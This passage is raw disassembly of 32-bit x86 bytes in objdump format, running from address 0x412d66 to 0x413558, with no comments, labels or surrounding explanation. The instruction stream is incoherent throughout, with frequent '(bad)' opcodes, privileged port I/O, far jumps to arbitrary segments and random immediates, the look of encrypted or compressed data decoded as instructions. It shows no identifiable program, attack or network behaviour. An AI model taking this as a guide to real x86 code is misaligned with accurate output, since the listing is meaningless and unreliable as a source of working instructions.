  412d66:	data16 arpl WORD PTR [edi-0x71ec328e],di
  412d6d:	mov    esp,0x346e3273
  412d72:	pusha  
  412d73:	loopne 0x412d94
  412d75:	jl     0x412d47
  412d77:	sub    cl,bh
  412d79:	popa   
  412d7a:	sti    
  412d7b:	or     al,0x21
  412d7d:	es in  eax,0xf2
  412d80:	aas    
  412d81:	mov    BYTE PTR [ebp+0x32da359b],bh
  412d87:	lds    edx,FWORD PTR [ebx+esi*4]
  412d8a:	inc    edi
  412d8b:	aad    0x31
  412d8d:	inc    ebp
  412d8e:	(bad)
  412d91:	sbb    al,0xab
  412d93:	and    dh,ah
  412d95:	mov    ds:0x4f5f9672,eax
  412d9a:	outs   dx,BYTE PTR ds:[esi]
  412d9b:	shl    ch,0x21
  412d9e:	mov    edi,0xa5a89bd6
  412da3:	xor    edi,DWORD PTR [esp+edx*1+0x18]
  412da7:	inc    BYTE PTR [edx+0x30ac6f75]
  412dad:	pushf  
  412dae:	jle    0x412dff
  412db0:	stc    
  412db1:	test   eax,0xa2481fdf
  412db6:	push   ebp
  412db7:	arpl   WORD PTR [ebx+0x6df2016d],cx
  412dbd:	shr    DWORD PTR [edx-0x26],0xde
  412dc1:	xlat   BYTE PTR ds:[ebx]
  412dc2:	shr    ebp,1
  412dc4:	mov    cl,0x8c
  412dc6:	aam    0xc4
  412dc8:	push   ebp
  412dc9:	outs   dx,DWORD PTR ds:[esi]
  412dca:	mov    ecx,0x5147e832
  412dcf:	aam    0xa5
  412dd1:	mov    eax,0x6843ee57
  412dd6:	cmp    al,0x9c
  412dd8:	jb     0x412e30
  412dda:	mov    ah,0x83
  412ddc:	dec    ecx
  412ddd:	xchg   ecx,eax
  412dde:	inc    edi
  412ddf:	lods   al,BYTE PTR ds:[esi]
  412de0:	in     al,dx
  412de1:	repnz dec ecx
  412de3:	adc    eax,0xdf8b3b50
  412de8:	pop    es
  412de9:	jno    0x412dc4
  412deb:	add    eax,0xee256022
  412df0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412df1:	aad    0xc0
  412df3:	jmp    0x49517653
  412df8:	sub    edx,DWORD PTR [ebx]
  412dfa:	test   BYTE PTR [esi-0x6e],bh
  412dfd:	jp     0x412db4
  412dff:	into   
  412e00:	lods   al,BYTE PTR ds:[esi]
  412e01:	xor    al,0x53
  412e03:	loop   0x412e57
  412e05:	cmp    DWORD PTR [eax-0x4d9a165],0x31c1d29f
  412e0f:	mov    ah,0x6b
  412e11:	outs   dx,DWORD PTR ds:[esi]
  412e12:	sbb    ebp,ecx
  412e14:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412e15:	lods   al,BYTE PTR ds:[esi]
  412e16:	imul   esp,edx,0x94cd6d5e
  412e1c:	inc    ecx
  412e1d:	repz pop esi
  412e1f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412e20:	pop    eax
  412e21:	scas   al,BYTE PTR es:[edi]
  412e22:	add    al,0x99
  412e24:	add    ah,dl
  412e26:	in     eax,dx
  412e27:	jae    0x412e44
  412e29:	pop    edx
  412e2a:	aad    0x26
  412e2c:	mov    dl,0xa7
  412e2e:	ja     0x412ea4
  412e30:	mov    al,ds:0x93fc7648
  412e35:	test   ah,0xbd
  412e38:	out    dx,eax
  412e39:	adc    BYTE PTR [eax+0xd],cl
  412e3c:	retf   0x52ad
  412e3f:	gs xchg ecx,eax
  412e41:	add    BYTE PTR [edx],ah
  412e43:	fstp   QWORD PTR [ebx]
  412e45:	and    bl,BYTE PTR [ebx+0x499b370e]
  412e4b:	inc    ebx
  412e4c:	pop    esi
  412e4d:	mov    ebp,0x937bda09
  412e52:	sbb    DWORD PTR [eax],ebx
  412e54:	enter  0xd754,0x49
  412e58:	jmp    0xeef8:0x24b48151
  412e5f:	clc    
  412e60:	loopne 0x412e5d
  412e62:	push   es
  412e63:	pop    eax
  412e64:	push   eax
  412e65:	dec    edi
  412e66:	adc    eax,0x7fb6d44c
  412e6b:	dec    ebp
  412e6c:	call   0x3bdb6a7e
  412e71:	icebp  
  412e72:	or     al,0x9b
  412e74:	mov    ebx,0xcee3d28c
  412e79:	cs push ds
  412e7b:	daa    
  412e7c:	mov    DWORD PTR [edi],0x1af52d5c
  412e82:	add    al,0xad
  412e84:	sahf   
  412e85:	outs   dx,BYTE PTR ds:[esi]
  412e86:	stc    
  412e87:	sub    eax,0x46c5447b
  412e8c:	ror    BYTE PTR [edi],0xcd
  412e8f:	cmp    edx,DWORD PTR [esi+ebp*2-0x4f63c21f]
  412e96:	shr    al,0xa9
  412e99:	addr16 int3 
  412e9b:	out    dx,al
  412e9c:	fidiv  WORD PTR [esi+esi*2+0x7d660b7a]
  412ea3:	daa    
  412ea4:	add    ch,al
  412ea6:	or     cl,0x5f
  412ea9:	mov    ch,0x22
  412eab:	scas   eax,DWORD PTR es:[edi]
  412eac:	ds test eax,0xfcf59eab
  412eb2:	or     eax,0xa730341
  412eb7:	xor    eax,0x4bfbfe8e
  412ebc:	pmulhuw mm6,QWORD PTR [esi+0x0]
  412ec0:	mov    ah,0x6b
  412ec2:	push   0xffffff93
  412ec4:	imul   eax,DWORD PTR ds:[esi-0x40319c19],0xffffffa0
  412ecc:	mov    ah,ch
  412ece:	mov    DWORD PTR [edx-0x3d91cdbb],ebx
  412ed4:	je     0x412ee3
  412ed6:	mov    ds:0x45c590e3,al
  412edb:	idiv   ah
  412edd:	jb     0x412ef1
  412edf:	and    bl,dl
  412ee1:	cmp    BYTE PTR [edx-0x7c],cl
  412ee4:	and    eax,0xfbc34ac4
  412ee9:	fwait
  412eea:	cmc    
  412eeb:	(bad)  
  412eec:	(bad)  
  412eed:	fst    QWORD PTR [ebx+0xa]
  412ef0:	jmp    0x412ede
  412ef2:	jecxz  0x412ea5
  412ef4:	cmp    al,0xb2
  412ef6:	lods   al,BYTE PTR ds:[esi]
  412ef7:	je     0x412f25
  412ef9:	pushf  
  412efa:	xchg   BYTE PTR [edi],al
  412efc:	pop    ss
  412efd:	xor    al,0xa0
  412eff:	call   0x5ebb8fe0
  412f04:	mov    al,ds:0x31e50ad1
  412f09:	out    dx,al
  412f0a:	xor    dl,bh
  412f0c:	lds    esp,FWORD PTR [esi+0x2e838992]
  412f12:	sub    eax,0x86f72acf
  412f17:	xlat   BYTE PTR ds:[ebx]
  412f18:	xchg   esi,eax
  412f19:	stos   DWORD PTR es:[edi],eax
  412f1a:	push   es
  412f1b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412f1c:	mov    DWORD PTR [ebp-0x660f1847],edx
  412f22:	into   
  412f23:	push   cs
  412f24:	or     al,0xbf
  412f26:	test   eax,0x6e2bd627
  412f2b:	xor    eax,0xd90bcc3d
  412f30:	ret    
  412f31:	push   edx
  412f32:	mov    ds:0xf9747c,eax
  412f37:	out    dx,al
  412f38:	call   0xf1d8b844
  412f3d:	push   0x38debadb
  412f42:	(bad)  
  412f43:	jle    0x412f15
  412f45:	ja     0x412fa3
  412f47:	js     0x412f66
  412f49:	lock (bad) 
  412f4c:	test   ebp,edx
  412f4e:	pop    ds
  412f4f:	loopne 0x412fb9
  412f51:	mov    edi,0x56a1107e
  412f56:	push   DWORD PTR [ebx]
  412f58:	and    BYTE PTR [esi],0x6e
  412f5b:	add    ebp,DWORD PTR [edx-0x47723b6c]
  412f61:	pop    edi
  412f62:	es push esi
  412f64:	dec    esi
  412f65:	jmp    0x6a85:0x76c4026a
  412f6c:	dec    edi
  412f6d:	and    eax,0xc8c0a669
  412f72:	scas   eax,DWORD PTR es:[edi]
  412f73:	int3   
  412f74:	jmp    0x412fbe
  412f76:	aam    0xc2
  412f78:	mov    ah,BYTE PTR ds:0x79d61191
  412f7e:	inc    edi
  412f7f:	xor    bl,ah
  412f81:	mov    ?,WORD PTR [edx+0x7c]
  412f84:	ret    
  412f85:	mov    edi,0x37e7d0fb
  412f8a:	sub    dh,BYTE PTR [ecx+0x28]
  412f8d:	xchg   edi,eax
  412f8e:	ins    BYTE PTR es:[edi],dx
  412f8f:	call   0xdcb8:0xcd6faaa2
  412f96:	outs   dx,BYTE PTR ds:[esi]
  412f97:	pusha  
  412f98:	add    ah,BYTE PTR [edi+esi*2]
  412f9b:	mov    ds:0xb4b88e2b,al
  412fa0:	lods   eax,DWORD PTR ds:[esi]
  412fa1:	dec    eax
  412fa2:	je     0x412fe3
  412fa4:	shl    BYTE PTR [ecx-0x6],0xdf
  412fa8:	rcr    BYTE PTR [esi-0x7a],0x30
  412fac:	aad    0x59
  412fae:	jmp    0x2c15:0x470ddf63
  412fb5:	push   esi
  412fb6:	dec    esi
  412fb7:	add    DWORD PTR [edx],ebp
  412fb9:	repz pop edi
  412fbb:	add    dh,BYTE PTR [eax-0x24]
  412fbe:	fldcw  WORD PTR [esi-0x7110e789]
  412fc4:	enter  0x21b3,0xcc
  412fc8:	(bad)  
  412fca:	out    dx,al
  412fcb:	lds    eax,FWORD PTR [ebx+0x332ffb7c]
  412fd1:	push   edx
  412fd3:	cmp    DWORD PTR [ebx+0x4],edx
  412fd6:	pop    ebp
  412fd7:	jne    0x412f8a
  412fd9:	repz cmp bl,0xef
  412fdd:	fwait
  412fde:	scas   al,BYTE PTR es:[edi]
  412fdf:	out    0xe9,al
  412fe1:	sub    al,0xe6
  412fe3:	cmp    eax,0xdb565633
  412fe8:	(bad)  
  412fea:	jb     0x412fed
  412fec:	push   ss
  412fed:	cli    
  412fee:	or     DWORD PTR [ecx-0x72],eax
  412ff1:	daa    
  412ff2:	jb     0x412fac
  412ff4:	sbb    ebx,0xc204f12f
  412ffa:	xor    edx,edx
  412ffc:	stos   BYTE PTR es:[edi],al
  412ffd:	retf   
  412ffe:	scas   al,BYTE PTR es:[edi]
  412fff:	fld    QWORD PTR [esi+0x79]
  413002:	dec    edx
  413003:	push   edx
  413004:	std    
  413005:	addr16 push ebp
  413007:	or     ah,BYTE PTR [edx-0x41]
  41300a:	and    ebp,edx
  41300c:	cmp    al,0xda
  41300e:	aad    0xba
  413010:	sub    al,0x9f
  413012:	cmp    eax,edi
  413014:	imul   edx,DWORD PTR [ebx+edi*4-0x4f],0x2d
  413019:	mul    DWORD PTR [esi]
  41301b:	dec    eax
  41301c:	ja     0x413007
  41301e:	sbb    al,0x85
  413020:	rol    DWORD PTR [edx-0x1e],0x40
  413024:	sahf   
  413025:	sbb    ebp,DWORD PTR [ecx-0x16]
  413028:	daa    
  413029:	push   es
  41302a:	out    0xed,eax
  41302c:	je     0x412ffb
  41302e:	push   eax
  41302f:	in     al,0xe1
  413031:	cli    
  413032:	pop    es
  413033:	loopne 0x413072
  413035:	mov    esp,0x1373ab8f
  41303a:	cmp    bl,BYTE PTR [bx-0x1f83]
  41303f:	sub    DWORD PTR [ebx+0x2e],edx
  413042:	xor    DWORD PTR [eax+0x1f3c17c7],0xffffffec
  413049:	cmc    
  41304a:	lods   al,BYTE PTR ds:[esi]
  41304b:	out    0xbb,eax
  41304d:	add    al,0x22
  41304f:	or     DWORD PTR [esi],edi
  413051:	add    eax,0x322a1e9e
  413056:	cmp    dl,ah
  413058:	sub    esi,DWORD PTR [ecx+0x666e3831]
  41305e:	jl     0x4130cf
  413060:	lea    esi,[esi-0x7f95bedc]
  413066:	pop    edi
  413067:	(bad)  
  413068:	sub    al,0x9a
  41306a:	fld    TBYTE PTR [edx]
  41306c:	dec    edi
  41306d:	pusha  
  41306e:	mov    ds:0x24725db0,eax
  413073:	xchg   edi,eax
  413074:	jg     0x413099
  413076:	xor    al,0xc7
  413078:	mov    BYTE PTR [eax+0x8],0x74
  41307c:	jbe    0x413005
  41307e:	icebp  
  41307f:	in     al,0xd0
  413081:	inc    eax
  413082:	mov    ch,0x82
  413084:	fs scas eax,DWORD PTR es:[edi]
  413086:	adc    al,0x2f
  413088:	add    al,0x4b
  41308a:	pop    ebx
  41308b:	fdivr  DWORD PTR [edx]
  41308d:	mov    bl,0x2a
  41308f:	mov    ecx,es
  413091:	in     eax,0xd3
  413093:	cmp    DWORD PTR [ecx],ebx
  413095:	adc    DWORD PTR [eax-0x58c54484],edx
  41309b:	jmp    0x9378:0x19c26b04
  4130a2:	std    
  4130a3:	daa    
  4130a4:	imul   ebp,edx,0x5b353d73
  4130aa:	sub    ebp,ecx
  4130ac:	imul   ebx,esi,0x5b
  4130af:	pushf  
  4130b0:	jmp    0x413043
  4130b2:	xchg   esi,eax
  4130b3:	dec    ebp
  4130b4:	ss inc edx
  4130b6:	sahf   
  4130b7:	ins    DWORD PTR es:[edi],dx
  4130b8:	pop    ss
  4130b9:	test   DWORD PTR [ecx+0x891e86f],0x8715f194
  4130c3:	call   0xa20b:0xf1333c6b
  4130ca:	jb     0x413149
  4130cc:	in     eax,dx
  4130cd:	mov    bl,bh
  4130cf:	mov    DWORD PTR [eax+0x342fb118],0xf1584153
  4130d9:	jmp    0x413135
  4130db:	or     BYTE PTR [ebx],dh
  4130dd:	nop
  4130de:	shr    BYTE PTR [ebp+0x6c],cl
  4130e1:	(bad)  
  4130e2:	jle    0x413134
  4130e4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4130e5:	jae    0x4130a2
  4130e7:	mov    eax,0x3ea6e8a6
  4130ec:	ret    0xf75b
  4130ef:	popf   
  4130f0:	cmp    eax,0x8057bdb2
  4130f5:	in     al,dx
  4130f6:	(bad)  
  4130f7:	and    al,BYTE PTR [esi-0x2e3a77c9]
  4130fd:	sti    
  4130fe:	inc    edx
  4130ff:	scas   al,BYTE PTR es:[edi]
  413100:	scas   al,BYTE PTR es:[edi]
  413101:	mov    dl,0x1c
  413103:	je     0x413110
  413105:	inc    ecx
  413106:	push   esi
  413107:	sbb    eax,0x22ace12e
  41310c:	lds    edx,FWORD PTR [edx]
  41310e:	adc    BYTE PTR [esi+0x3e],bl
  413111:	sbb    al,0xc0
  413113:	mov    ch,0x73
  413115:	or     al,0x8e
  413117:	call   0xd7ed331b
  41311c:	xor    esp,DWORD PTR [esi+0xb]
  41311f:	jne    0x4130f6
  413121:	pop    ebx
  413122:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413123:	jmp    0xfdd5:0x4a897d0c
  41312a:	ret    
  41312b:	jb     0x413193
  41312d:	push   0xffffff92
  41312f:	aam    0x45
  413131:	rol    BYTE PTR [ebx],cl
  413133:	mov    ebp,0xb71d86e1
  413138:	xchg   edi,eax
  413139:	xlat   BYTE PTR ds:[ebx]
  41313a:	icebp  
  41313b:	pop    edx
  41313c:	cs jmp 0x24b4d811
  413142:	sub    BYTE PTR ds:0x70281302,bl
  413148:	xchg   edx,eax
  413149:	fnstenv [ebp-0x74]
  41314c:	cwde   
  41314d:	dec    ebp
  41314e:	sbb    eax,0x5fc8ca60
  413153:	fisub  WORD PTR [esi-0x59f9db8a]
  413159:	mov    cs,WORD PTR [edi-0x20bae8f0]
  41315f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413160:	fisttp DWORD PTR [ebx+0x77]
  413163:	or     ebp,DWORD PTR [ecx+0x16dbaad5]
  413169:	mov    BYTE PTR [eax+0x7f767337],dl
  41316f:	push   ebp
  413170:	(bad)  
  413171:	jno    0x41317c
  413173:	call   0x13885dd2
  413178:	popf   
  413179:	test   eax,0xd8f2f381
  41317e:	pop    eax
  41317f:	or     BYTE PTR [eax+esi*2],ah
  413182:	sar    DWORD PTR [edi+ebx*1-0x531a35a8],0x7
  41318a:	loopne 0x4131af
  41318c:	pop    edi
  41318d:	xchg   esi,eax
  41318e:	mov    ecx,0x83732bd
  413193:	dec    ebx
  413194:	cmp    edx,DWORD PTR [ebx+0x67]
  413197:	fwait
  413198:	push   edi
  413199:	push   edi
  41319a:	fcomp  DWORD PTR [edi]
  41319c:	ins    DWORD PTR es:[edi],dx
  41319d:	gs rol bh,cl
  4131a0:	pop    ds
  4131a1:	sub    edx,DWORD PTR [edx+0x47bb354c]
  4131a7:	xor    dh,bl
  4131a9:	(bad)  
  4131aa:	lahf   
  4131ab:	cmc    
  4131ac:	into   
  4131ad:	sbb    dl,BYTE PTR [ebx-0x737b0834]
  4131b3:	daa    
  4131b4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4131b5:	inc    ecx
  4131b7:	mov    ecx,0x54f0a5aa
  4131bc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4131bd:	leave  
  4131be:	aam    0xc4
  4131c0:	bound  edx,QWORD PTR [esi]
  4131c2:	xlat   BYTE PTR ds:[ebx]
  4131c3:	inc    ebp
  4131c4:	lahf   
  4131c5:	stos   BYTE PTR es:[edi],al
  4131c6:	adc    BYTE PTR [eax+0x381b1a97],bh
  4131cc:	jg     0x413209
  4131ce:	mov    ebp,0x7af1d3f6
  4131d3:	dec    esi
  4131d4:	xchg   bp,ax
  4131d6:	mov    DWORD PTR [ebx+0x44fb56de],esi
  4131dc:	jg     0x41322c
  4131de:	mov    ecx,0xe4ff10a6
  4131e3:	inc    ecx
  4131e4:	jae    0x413179
  4131e6:	cli    
  4131e7:	xor    al,0x60
  4131e9:	push   ecx
  4131ea:	cmp    eax,0x620a8e2f
  4131ef:	push   cs
  4131f0:	push   esi
  4131f1:	das    
  4131f2:	or     DWORD PTR ds:0xbe9ff3c4,ebx
  4131f8:	daa    
  4131f9:	sub    DWORD PTR [edi+0xf],0xffffff97
  4131fd:	xor    eax,0x711703af
  413202:	outs   dx,BYTE PTR ds:[esi]
  413203:	(bad)  
  413204:	clc    
  413205:	nop
  413206:	inc    edx
  413207:	les    ecx,FWORD PTR [edx-0x7e]
  41320a:	or     eax,0x80d0cfc9
  41320f:	xor    al,0x49
  413212:	shl    bl,cl
  413214:	mov    BYTE PTR [edi-0x56],ch
  413217:	xor    al,0x78
  413219:	xchg   ecx,eax
  41321a:	das    
  41321b:	ja     0x41322e
  41321d:	push   0x458f8fb3
  413222:	test   eax,0x47acd6b7
  413227:	imul   ebp,DWORD PTR [ecx],0xffffff9e
  41322a:	pop    edx
  41322b:	enter  0x63b2,0xc0
  41322f:	xchg   DWORD PTR [edx+0x46825372],esi
  413235:	jmp    0x6af7:0xecf036f0
  41323c:	cwde   
  41323d:	ss dec ecx
  41323f:	aas    
  413240:	mov    ah,0xf2
  413242:	loopne 0x413203
  413244:	mov    ebp,0x4a0e493b
  413249:	mov    ds:0x3c3f5728,eax
  41324e:	neg    BYTE PTR [ecx]
  413250:	dec    edx
  413251:	mov    bl,al
  413253:	pop    ebx
  413254:	cdq    
  413255:	inc    ebp
  413256:	pop    ss
  413257:	ja     0x413258
  413259:	jb     0x413284
  41325b:	in     eax,dx
  41325c:	daa    
  41325d:	mov    dh,0xec
  41325f:	imul   ebp,DWORD PTR [edi-0xc],0x48
  413263:	or     eax,0x86663444
  413268:	jg     0x4132bb
  41326a:	(bad)  
  41326c:	mov    esp,0x7535f473
  413271:	sub    DWORD PTR ds:0x443201bd,esp
  413277:	xor    DWORD PTR ds:0xda5d142e,edx
  41327d:	dec    eax
  41327e:	mov    cl,0xee
  413280:	jecxz  0x41324a
  413282:	int    0x2d
  413284:	mov    al,0x71
  413286:	jle    0x413300
  413288:	add    BYTE PTR [edi+0x2f],dh
  41328b:	inc    esp
  41328c:	jb     0x413276
  41328e:	push   ebp
  41328f:	aas    
  413290:	pop    es
  413291:	imul   BYTE PTR [esi]
  413293:	mov    bh,al
  413295:	or     eax,0xfbf4ae49
  41329a:	mov    al,0x28
  41329c:	neg    DWORD PTR [ebp+0x3b847487]
  4132a2:	les    ebx,FWORD PTR [edx-0x27]
  4132a5:	xor    dl,BYTE PTR [eax+0xd8ae83e]
  4132ab:	sbb    al,0xc2
  4132ad:	mov    ah,0x69
  4132af:	xor    BYTE PTR [ecx],dh
  4132b1:	mov    ch,0x13
  4132b3:	outs   dx,DWORD PTR ds:[esi]
  4132b4:	and    BYTE PTR [edi+eax*1+0x16382a09],dh
  4132bb:	and    BYTE PTR [edi],ch
  4132bd:	mov    edi,0x9644f433
  4132c2:	scas   eax,DWORD PTR es:[edi]
  4132c3:	repnz out dx,al
  4132c5:	or     dl,BYTE PTR [esp+esi*2]
  4132c8:	lods   eax,DWORD PTR ds:[esi]
  4132c9:	or     BYTE PTR [esi+edi*4+0x355ed8c4],ch
  4132d0:	fs aad 0xbe
  4132d3:	jae    0x4132bb
  4132d5:	mov    edi,DWORD PTR [eax]
  4132d7:	push   0x15448cb0
  4132dc:	cmp    esi,esi
  4132de:	sub    esp,DWORD PTR [ebp-0x33]
  4132e1:	dec    edx
  4132e2:	or     eax,0x653e36a8
  4132e7:	xchg   ebx,eax
  4132e8:	dec    esp
  4132e9:	ins    DWORD PTR es:[edi],dx
  4132ea:	and    eax,0xf3698c46
  4132ef:	add    eax,0x9458be3b
  4132f4:	out    dx,al
  4132f5:	(bad)  
  4132f6:	or     esi,DWORD PTR ds:0x7e6a357b
  4132fc:	sbb    ch,BYTE PTR [ebx]
  4132fe:	push   es
  4132ff:	xor    bl,BYTE PTR [eax-0x1e]
  413302:	out    dx,al
  413303:	in     eax,dx
  413304:	xor    ecx,DWORD PTR [ebp-0x77e7e849]
  41330a:	std    
  41330b:	push   ebp
  41330c:	sub    al,0xb0
  41330e:	adc    BYTE PTR [ebp-0x43],0xd8
  413312:	pushf  
  413313:	push   ecx
  413314:	jg     0x4132b8
  413316:	inc    ecx
  413317:	sbb    DWORD PTR [eax+0x47],esi
  41331a:	jns    0x413387
  41331c:	cmp    edx,0xcf5306d
  413322:	push   cs
  413323:	leave  
  413324:	out    dx,al
  413325:	sar    BYTE PTR [eax],cl
  413327:	add    DWORD PTR [ecx],ecx
  413329:	rol    DWORD PTR [edx*1+0x932be3a],cl
  413330:	into   
  413331:	arpl   WORD PTR [edx-0x2f17f5ce],sp
  413337:	mov    BYTE PTR [eax],ch
  413339:	xor    bl,BYTE PTR [edi+eax*2+0x0]
  41333d:	retf   0x98da
  413340:	cmp    eax,0xed8435a2
  413345:	xchg   edi,eax
  413346:	xchg   DWORD PTR [ebp+0x4ae3b5e0],edx
  41334c:	cwde   
  41334d:	or     edi,DWORD PTR [esi-0x5e]
  413350:	jne    0x413377
  413352:	call   0xa7de:0xd68f8e38
  413359:	ins    BYTE PTR es:[edi],dx
  41335a:	enter  0xd1d7,0xc0
  41335e:	sahf   
  41335f:	js     0x41337d
  413361:	stc    
  413362:	clc    
  413363:	pushf  
  413364:	push   esi
  413365:	and    DWORD PTR [esi+esi*1-0x3f],eax
  413369:	jecxz  0x413325
  41336b:	inc    esi
  41336c:	sbb    BYTE PTR [eax],al
  41336e:	dec    ebx
  41336f:	push   edx
  413370:	imul   eax,DWORD PTR [esp+ebp*4],0x2e
  413374:	mov    al,ds:0x692590d9
  413379:	pop    eax
  41337a:	shl    al,cl
  41337c:	ss ja  0x41336b
  41337f:	sub    DWORD PTR [ecx-0x2720d7d],edi
  413385:	outs   dx,BYTE PTR ds:[esi]
  413386:	add    al,0x8a
  413388:	rol    BYTE PTR [ecx-0x70521d6],cl
  41338e:	cmp    DWORD PTR [edx+ecx*8+0x11],ecx
  413392:	mov    WORD PTR [ebx+0x169efd31],?
  413398:	pop    esi
  413399:	stc    
  41339a:	rcl    BYTE PTR [ecx+ecx*4+0x4f],1
  41339e:	stos   DWORD PTR es:[edi],eax
  41339f:	pop    esp
  4133a0:	lock (bad) 
  4133a3:	sar    ecx,0x6c
  4133a6:	inc    bp
  4133a8:	(bad)  
  4133a9:	fcmovnu st,st(6)
  4133ab:	push   0x2dcaad08
  4133b0:	sub    ah,BYTE PTR [ebp-0x31904c3f]
  4133b6:	aaa    
  4133b7:	loop   0x41341b
  4133b9:	imul   edi,DWORD PTR [ecx-0x36ce6503],0x4
  4133c0:	xor    al,ch
  4133c2:	xchg   edx,eax
  4133c3:	mov    eax,0x5756ef70
  4133c8:	and    al,0x47
  4133ca:	lods   eax,DWORD PTR ds:[esi]
  4133cb:	dec    edx
  4133cc:	out    dx,eax
  4133cd:	and    edi,DWORD PTR [edi+0x6d]
  4133d0:	leave  
  4133d1:	stos   BYTE PTR es:[edi],al
  4133d2:	aam    0x6f
  4133d4:	dec    edi
  4133d5:	push   ebp
  4133d6:	push   ebx
  4133d7:	pop    ss
  4133d8:	pushf  
  4133d9:	into   
  4133da:	out    dx,eax
  4133db:	cmp    al,0x3
  4133dd:	jo     0x41342b
  4133df:	sub    eax,0xcfbd183b
  4133e4:	or     ebx,DWORD PTR [ebx]
  4133e6:	fstp   DWORD PTR [ecx]
  4133e8:	mov    bl,0x46
  4133ea:	mov    edx,0x8526ae23
  4133ef:	ror    DWORD PTR [ebx-0x27],0x6f
  4133f3:	jp     0x683dce8f
  4133f9:	pop    esi
  4133fa:	jmp    0x6816:0xf9699a1b
  413401:	nop
  413402:	xchg   esi,eax
  413403:	aam    0xbb
  413405:	jo     0x413389
  413407:	daa    
  413408:	jne    0x41345c
  41340a:	pop    ds
  41340b:	bnd jne 0x413476
  41340e:	adc    BYTE PTR [edx+0x189a9a53],0x12
  413415:	jb     0x413419
  413417:	scas   eax,DWORD PTR es:[edi]
  413418:	mov    al,0x2f
  41341a:	xor    BYTE PTR [esi+0x5c],0x99
  41341e:	les    esp,FWORD PTR [edx+ebx*8-0x41903cc9]
  413425:	adc    bl,BYTE PTR [esi-0x4f]
  413428:	imul   eax,DWORD PTR [eax],0xb132eab0
  41342e:	ret    
  41342f:	push   ds
  413430:	fs and al,0x75
  413433:	xrelease mov BYTE PTR ds:0x72b107ec,dh
  41343a:	(bad)  
  41343b:	cld    
  41343c:	or     eax,0x6f4417f4
  413441:	pop    esi
  413442:	out    dx,eax
  413443:	scas   al,BYTE PTR es:[edi]
  413444:	fstp   st(2)
  413446:	aaa    
  413447:	fwait
  413448:	xlat   BYTE PTR ds:[ebx]
  413449:	ret    
  41344a:	ins    BYTE PTR es:[edi],dx
  41344b:	out    dx,al
  41344c:	(bad)  
  41344d:	ds jg  0x413404
  413450:	mov    ah,ch
  413452:	outs   dx,DWORD PTR ds:[esi]
  413453:	or     ebx,DWORD PTR [eax-0x3241270d]
  413459:	(bad)  
  41345a:	jmp    0x4133ff
  41345c:	ins    DWORD PTR es:[edi],dx
  41345d:	pop    ds
  41345e:	mov    BYTE PTR ds:0x6a6ced2e,bh
  413464:	sub    eax,0xe0baee45
  413469:	or     eax,DWORD PTR [edi-0x59548f73]
  41346f:	mov    BYTE PTR [ecx-0xa8c0a51],cl
  413475:	shl    BYTE PTR [edi],cl
  413477:	jmp    0x4106:0x8098506
  41347e:	add    BYTE PTR [esi],al
  413480:	rcl    BYTE PTR [esi-0x51c227b3],0xb0
  413487:	(bad)  
  413488:	sub    edi,esp
  41348a:	adc    BYTE PTR [ebx+0x2d],bl
  41348d:	mov    ecx,0x436b9d34
  413492:	push   edx
  413493:	test   eax,0x115b7b7b
  413498:	outs   dx,DWORD PTR ds:[esi]
  413499:	fdiv   DWORD PTR ds:0x8d6b56be
  41349f:	mov    DWORD PTR [ebx-0x3c],ebp
  4134a2:	inc    ebx
  4134a3:	pushf  
  4134a4:	xor    cl,BYTE PTR [ebx-0x1932f327]
  4134aa:	lock loopne 0x413447
  4134ad:	pop    ecx
  4134ae:	ficom  WORD PTR [edx]
  4134b0:	fdivrp st(0),st
  4134b2:	lahf   
  4134b3:	out    0x33,al
  4134b5:	xor    ecx,ecx
  4134b7:	inc    esp
  4134b8:	sti    
  4134b9:	jp     0x413447
  4134bb:	sbb    BYTE PTR ds:[eax+0x4],dl
  4134bf:	jge    0x41347f
  4134c1:	dec    esi
  4134c2:	call   0xb15bb31b
  4134c7:	lods   al,BYTE PTR ds:[esi]
  4134c8:	aas    
  4134c9:	mov    BYTE PTR [esi+0x23],0xab
  4134cd:	int3   
  4134ce:	lock mov ch,0x43
  4134d1:	stc    
  4134d2:	(bad)  
  4134d3:	cld    
  4134d4:	pop    es
  4134d5:	mov    dh,0x4
  4134d7:	mov    esp,0x9268b7af
  4134dc:	into   
  4134dd:	push   edi
  4134de:	jmp    0xb807:0x316ec997
  4134e5:	pop    edx
  4134e6:	adc    eax,DWORD PTR [esi+0x769af3c9]
  4134ec:	lock dec ebp
  4134ee:	and    al,0x1c
  4134f0:	add    dl,dh
  4134f2:	cmp    edx,esp
  4134f4:	out    0xeb,eax
  4134f6:	pop    ebx
  4134f7:	pop    edi
  4134f8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4134f9:	and    ebp,DWORD PTR [edx+0x713e10e2]
  4134ff:	jae    0x4134b5
  413501:	push   esi
  413502:	jl     0x413495
  413504:	cwde   
  413505:	fs adc BYTE PTR es:[edi],0xf9
  41350a:	outs   dx,BYTE PTR ds:[esi]
  41350b:	les    esp,FWORD PTR [eax+0x15]
  41350e:	int3   
  41350f:	cdq    
  413510:	cmp    ebp,DWORD PTR [edx-0x5d]
  413513:	sbb    BYTE PTR [edi+esi*8+0x12a43531],0xb1
  41351b:	test   eax,0x91a30507
  413520:	xor    BYTE PTR [ebx],dl
  413522:	mov    dh,0x9
  413524:	inc    ebp
  413525:	inc    esp
  413526:	pop    esp
  413527:	pop    edx
  413528:	cmp    BYTE PTR [edx+0x78fd5911],ch
  41352e:	cmp    eax,0x90d1d97
  413533:	mov    bh,0x88
  413535:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413536:	push   esp
  413537:	enter  0x9b01,0x39
  41353b:	xchg   ebp,eax
  41353c:	add    eax,0x82ae142c
  413541:	mov    eax,ds:0x5beac8a0
  413546:	adc    dh,ah
  413548:	cmp    eax,0x5b320661
  41354d:	outs   dx,BYTE PTR ds:[esi]
  41354e:	xlat   BYTE PTR ds:[ebx]
  41354f:	ja     0x4134f6
  413551:	add    BYTE PTR [eax+0x5948f15c],dh
  413557:	dec    edi
  413558:	in     eax,0x18
